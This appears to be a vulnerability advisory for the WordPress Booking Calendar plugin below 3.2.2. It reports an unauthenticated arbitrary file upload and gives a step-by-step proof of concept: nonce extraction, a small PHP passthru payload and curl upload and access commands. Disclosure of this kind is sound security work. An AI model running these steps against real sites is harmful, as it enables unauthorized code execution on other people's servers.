## WordPress Plugin Vulnerabilities

# Booking Calendar < 3.2.2 - Unauthenticated Arbitrary File Upload

### Description

The plugin does not validate uploaded files, which could allow unauthenticated users to upload arbitrary files, such as PHP and achieve RCE

### Proof of Concept

1. As an unauthenticated user, navigate to the main WordPress page
2. Extract a valid nonce from the page source (CTRL+F for "var wpdevart =", field "ajaxNonce")
3. Prepare a payload for upload:
echo '<?php passthru("id"); ?>' > /tmp/poc.php
4. Upload the payload with cURL, with the previously extracted nonce:
curl -i https://example.com/wp-admin/admin-ajax.php \
-F 'action=wpdevart\_form\_ajax' \
-F 'wpdevart\_id=x' \
-F 'wpdevart\_nonce=<NONCE HERE>' \
-F 'wpdevart\_data={"wpdevart-submit":"X"}' \
-F 'wpdevart-submit=1' \
-F 'file=@/tmp/poc.php'
5. Access your payload, it should have been uploaded to "/wp-content/uploads/booking\_calendar/<filename>"
curl -i https://example.com/wp-content/uploads/booking\_calendar/poc.php
